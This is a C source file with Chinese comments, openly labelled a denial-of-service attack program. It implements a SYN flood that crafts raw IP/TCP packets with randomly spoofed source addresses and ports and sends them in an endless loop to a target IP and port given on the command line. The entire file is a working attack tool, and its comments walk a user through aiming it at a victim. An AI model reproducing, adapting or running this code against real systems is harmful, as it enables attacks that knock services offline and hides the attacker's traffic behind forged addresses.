/* dos.c - 一个dos( denial of service:拒绝服务)攻击程序 */  
  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <netdb.h>  
#include <string.h>  
#include <sys/types.h>  
#include <sys/time.h>  
#include <netinet/in.h>  
#include <linux/ip.h>  
#include <linux/tcp.h>  
  
  
int sock_fd;  
  
/* tcp 伪头部, 计算校验和时需要, 可以参考rfc 793 */  
typedef struct psheader {    
    unsigned long saddr;    /* 源IP地址                */  
    unsigned long daddr;    /* 目的IP地址               */  
    char mbz;       /* mbz = must be zero, 用于填充对齐 */  
    char protocal;      /* 8位协议号                */    
    unsigned short tcpl;    /* TCP包长度               */  
} pheader;  
  
  
/* 一个通用的计算校验和的函数 */  
  
static unsigned short ip_sum ( u_short *addr, int len )  
{  
    register int nleft = len;  
    register u_short * w = addr;  
    register int sum = 0;  
  
    u_short answer = 0;  
      
    while ( nleft > 1 ) {  
        sum += *w++;  
        nleft -= 2;  
    }  
  
    if ( nleft == 1 ) {  
        *(u_char *) (&answer) = *(u_char *) w;  
        sum += answer;  
    }  
  
    /* sum = 高16位的值加上低16位 */  
    sum = (sum >> 16) + (sum & 0xffff);     
    /* 加上近位           */  
    sum += (sum >> 16);                      
    /* 取反,同时变成16位有效      */  
    answer = ~sum;                    
    return (answer);  
}  
  
/* 重新计算ip和tcp头的校验和,并存入相应的协议字段 */  
void re_cal_checksum( struct iphdr * ih, struct tcphdr * th )  
{  
    pheader ph;  
    char buf[100];  
      
    /* 伪头源ip地址   */  
    ph.saddr = ih->saddr;  
    /* 伪头目的ip地址 */  
    ph.daddr = ih->daddr;  
    ph.mbz = 0;  
    /* 协议             */  
    ph.protocal = IPPROTO_TCP;  
    /* tcp包长度     */  
    ph.tcpl = htons( sizeof( struct tcphdr ) );  
      
    memcpy( buf, &ph, sizeof( pheader ) );  
    memcpy( buf + sizeof(pheader), th, sizeof( struct tcphdr ) );  
    memset( buf + sizeof(pheader) + sizeof(struct tcphdr), 0, 4 );  
    th->check = ip_sum( (u_short*)buf, (sizeof(pheader)+sizeof(struct tcphdr)+1)&~1);  
      
    memcpy(buf, ih, 4*ih->ihl);  
    memcpy(buf+4*ih->ihl, th, sizeof(*th));  
    memset(buf+4*ih->ihl+sizeof(*th), 0, 4);  
      
    ih->check=ip_sum( (u_short*)buf, (4*ih->ihl + sizeof(*th) + 1) & ~1);  
    memcpy(buf, ih, 4*ih->ihl);  
}  
  
void init_tcp_ip_head( struct iphdr * ih, struct tcphdr * th, unsigned long dest_ip, unsigned short dest_port)  
{  
    /* IP版本, 现在基本都用ipv4            */  
    ih->version = 4;  
    /* ip首部长度, 一般都为20个字节, 由于ihl是表示多少个4字节,因此要除以4,等于5 */  
    ih->ihl = 5;  
    /* 服务类型                */  
    ih->tos = 0;  
    /* ip数据包的总长度               */  
    ih->tot_len = sizeof( struct iphdr ) + sizeof( struct tcphdr );  
    /* 16位标识                       */  
    ih->id = ( unsigned int )random();  
    /* 碎片偏移                    */  
    ih->frag_off = 0;  
    /* 8位生存时间                  */  
    ih->ttl = ( unsigned int )random()%150 + 20;  
    /* 指定传输层采用的协议,我们当然要采用TCP咯 */  
    ih->protocol = IPPROTO_TCP;  
    /* 校验和, 等下会重新计算, 先初始化为0 */  
    ih->check = 0;     
    /* 源ip地址, 初始化的时候,   */  
    ih->saddr = ( unsigned int )random();  
    /* 你要攻击的目标IP地址         */  
    ih->daddr = dest_ip;  
    /* ok, ip 头初始化完毕 */  
      
    /* tcp 源端口号, 随便给一个         */  
    th->source = ( unsigned int )random() % 30000 + 4096;  
    /* 目的端口号,你要攻击对方的端口       */  
    th->dest = htons( dest_port );  
    /* 32位序列号,随便给一个        */  
    th->seq = ( unsigned int )random();  
    /* 32位确认序列号,由于我们是攻击方,因此这个值可以随便给 */  
    th->ack_seq = 0;  
    /* tcp 首部长度,一般为20,同样需要除以4 */  
    th->doff = sizeof( struct tcphdr ) / 4;  
    /* 保留值, 随便给                */  
    th->res1 = 0;  
    /* 发送端还没发送完成                  */  
    th->fin = 0;  
    /* 用来发起一个连接,此位一定要置1      */  
    th->syn = 1;  
    /* 重建连接,当然没必要,因此为0         */  
    th->rst = 0;  
    /* 接受方应尽快把这个报文交给应用层    */  
    th->psh = 0;  
    /* 确认序号,现在我们是发起连接,不是确认*/  
    th->ack = 0;  
    /* 紧急指针                */  
    th->urg = 0;  
    /* 16窗口大小,接受端期望接受的字节数   */  
    th->window = htons( 65535 );  
    /* 现在只是初始,等下回校验        */  
    th->check = 0;  
    /* 16位紧急指针                 */  
    th->urg_ptr = 0;  
    /* OK, tcp 头初始化完毕   */  
}  
  
void send_connect( int sockfd, char * buf )  
{  
    struct iphdr * ih = ( struct iphdr * ) buf;  
    struct tcphdr * th = ( struct tcphdr * )( buf + sizeof(struct iphdr) );  
  
    /* 被攻击的机器的地址结构 */  
    struct sockaddr_in target;  
    target.sin_family = AF_INET;  
    target.sin_port = th->dest;  
    target.sin_addr.s_addr = ih->daddr;  
      
    /* 发送连接数据    */  
    int ret;  
    ret = sendto( sockfd, buf, sizeof(struct iphdr)+sizeof(struct tcphdr), 0,   
            (struct sockaddr*)&target, sizeof(target) );  
    if( ret == -1 ) {  
        perror("send packet");  
        exit(1);  
    }  
}  
  
int main( int argc, char **argv )  
{  
    int i;  
    unsigned short int dest_port;  
    unsigned long int dest_ip;  
     
    /* 处理用户的命令行输入, 如果用户不指定ip地址的话, 默认是攻击自己, 如果不指定端口号的话,默认就是22 */  
    if( argc == 1 ){  
        dest_ip = inet_addr( "127.0.0.1" );  
        dest_port = htons( 22 );  
    } else if( argc == 2 ) {  
        dest_ip = inet_addr( argv[1] );  
        dest_port = htons( 22 );  
    } else if( argc == 3 ) {  
        dest_ip = inet_addr( argv[1] );  
        dest_port=ntohs(atoi( argv[2]) );  
    } else {  
        printf("Usage: %s [你要攻击的ip地址] [你要攻击的port number] \n", argv[0] );  
        exit( 1 );  
    }  
      
    /* 创建一个原始的套接口, 自己封装ip头和tcp头 */  
    sock_fd = socket( AF_INET, SOCK_RAW, IPPROTO_RAW );  
    if( sock_fd == -1 ) {  
        perror("socket");  
        exit(1);  
    }  
  
    /* buf - 用于存储ip 和 tcp头 */  
    char * buf = malloc( sizeof(struct iphdr) + sizeof(struct tcphdr) );  
    /* ip 头结构  */  
    struct iphdr * ih = ( struct iphdr * ) buf;  
    /* tcp 头结构 */  
    struct tcphdr * th = ( struct tcphdr * )( buf + sizeof(struct iphdr) );  
      
    /* 初始化tcp和ip头结构 */  
    init_tcp_ip_head( ih, th, dest_ip, dest_port );  
      
    while ( 1 ) {  
        /* 伪装源ip地址 */  
        ih->saddr = ( unsigned int )random();  
        /* 伪装源端口号 */  
        th->source = ( unsigned int )random() % 30000 + 4096;  
          
        /* 重新计算 ip头和tcp头的校验和 */  
        re_cal_checksum( ih, th );  
          
        /* 发送连接请求, 开始攻击 */    
        send_connect( sock_fd, buf );  
    }     
}  